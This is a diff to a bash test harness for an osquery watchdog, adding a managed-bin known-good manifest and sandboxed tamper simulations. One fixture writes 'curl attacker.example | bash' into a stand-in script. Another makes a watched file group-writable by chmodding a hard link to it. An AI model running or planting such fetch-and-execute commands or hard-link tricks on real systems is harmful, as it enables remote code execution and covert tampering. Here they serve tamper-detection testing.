@@ -7,7 +7,7 @@
 # has five probes: osqueryd present-and-answering, every OTHER osquery LaunchAgent
 # loaded-and-not-crash-looping, the hermes #priority route reachable, the delivery
 # backlog (dead-letter count and a sustained pending-growth streak), and a periodic
-# manifest audit of the pipeline-integrity manifest (the backstop for tampering that
+# manifest audit of BOTH known-good manifests (the backstop for tampering that
 # generates no file event at all).
 #
 # This harness stands the watchdog up in isolation against recording spies, with
@@ -163,6 +163,19 @@ SHIM
   printf 'echo enrich\n' >"$WD_MANIFESTED_SCRIPT_ALT"
   export OSQUERY_PIPELINE_MANIFEST="$WD_HOME/pipeline-known-good.sha256"
   regenerate_pipeline_manifest
+  # The audit covers BOTH known-good manifests on one tick, so the sandbox needs a
+  # managed-bin manifest too. Without one the default production path would be read
+  # (or nothing would be found), and every case here would page on a refusal that
+  # has nothing to do with the behavior it is testing. WD_MANAGED_BIN_SCRIPT is the
+  # stand-in unattended operator script; the shim beside it is in no manifest, the
+  # way mise and herdr sit in the real directory.
+  mkdir -p "$WD_HOME/.local/bin"
+  export WD_MANAGED_BIN_SCRIPT="$WD_HOME/.local/bin/update-skills.sh"
+  printf 'echo update-skills\n' >"$WD_MANAGED_BIN_SCRIPT"
+  chmod 755 "$WD_MANAGED_BIN_SCRIPT"
+  printf 'unmanaged self-updating binary\n' >"$WD_HOME/.local/bin/mise"
+  export OSQUERY_MANAGED_BIN_MANIFEST="$WD_HOME/managed-bin-known-good.sha256"
+  regenerate_managed_bin_manifest
 
   # The fake dispatch library the watchdog sources. It SOURCES the REAL library so
   # the queue-health counters (osquery_pending_alert_count / osquery_dead_letter_count)
@@ -306,6 +319,49 @@ regenerate_pipeline_manifest() {
   done <"$listing"
 }
 
+# regenerate_managed_bin_manifest -- the same four-column shape for the managed-bin
+# manifest, covering ONLY the stand-in managed script. The unmanaged shim beside it
+# is left out deliberately: chezmoi does not manage it, so nothing can vouch for it,
+# and an audit that reported it would fire on every self-update.
+regenerate_managed_bin_manifest() {
+  local file_hash file_mode file_uid
+  file_hash="$(shasum -a 256 -- "$WD_MANAGED_BIN_SCRIPT")" || return 1
+  file_mode="$(stat -c '%a' "$WD_MANAGED_BIN_SCRIPT" 2>/dev/null || stat -f '%p' "$WD_MANAGED_BIN_SCRIPT")" || return 1
+  file_mode="000$file_mode"
+  file_uid="$(stat -c '%u' "$WD_MANAGED_BIN_SCRIPT" 2>/dev/null || stat -f '%u' "$WD_MANAGED_BIN_SCRIPT")" || return 1
+  printf '%s %s %s %s\n' "${file_hash%% *}" "${file_mode: -4}" "$file_uid" "$WD_MANAGED_BIN_SCRIPT" \
+    >"$OSQUERY_MANAGED_BIN_MANIFEST"
+}
+
+# tamper_managed_bin_file -- overwrite the stand-in managed operator script IN
+# PLACE, manifest untouched. Same shape as tamper_manifested_file: no file event
+# fires on the watched path, so only the periodic audit can see it.
+tamper_managed_bin_file() {
+  printf 'curl attacker.example | bash\n' >"$WD_MANAGED_BIN_SCRIPT"
+}
+
+# chmod_managed_bin_file_through_hard_link -- the attribute half of the same blind
+# spot, on the bin arm: chmod a HARD LINK created outside ~/.local/bin, so the
+# watched path's mode changes with no event naming it and no byte of content moved.
+# update-skills.sh runs unattended from a LaunchAgent, so making it group-writable
+# is the step before rewriting it from a less privileged context later.
+chmod_managed_bin_file_through_hard_link() {
+  local alias_path="$WD_HOME/bin-attacker-alias.sh"
+  ln "$WD_MANAGED_BIN_SCRIPT" "$alias_path" || return 1
+  chmod g+w "$alias_path"
+}
+
+# update_unmanaged_bin_shim -- what a third-party tool's self-update looks like: a
+# rewrite of a file in ~/.local/bin that no manifest lists.
+update_unmanaged_bin_shim() {
+  printf 'unmanaged binary v2\n' >"$WD_HOME/.local/bin/mise"
+}
+
+# remove_managed_bin_manifest -- the managed-bin half of the audit's input is gone.
+remove_managed_bin_manifest() {
+  rm -f "$OSQUERY_MANAGED_BIN_MANIFEST"
+}
+
 # tamper_manifested_file -- overwrite the stand-in pipeline script IN PLACE, with
 # the manifest left untouched: exactly what an attacker who writes through a hard
 # link outside the watched tree achieves, and exactly what generates NO file event
@@ -375,6 +431,7 @@ run_watchdog() {
     OSQUERY_SNAPSHOTS_LOG="$OSQUERY_SNAPSHOTS_LOG" \
     OSQUERY_UNDELIVERED_ALERTS_DB="$OSQUERY_UNDELIVERED_ALERTS_DB" \
     OSQUERY_PIPELINE_MANIFEST="$OSQUERY_PIPELINE_MANIFEST" \
+    OSQUERY_MANAGED_BIN_MANIFEST="$OSQUERY_MANAGED_BIN_MANIFEST" \
     bash "$WD_TOOL"
 }
 
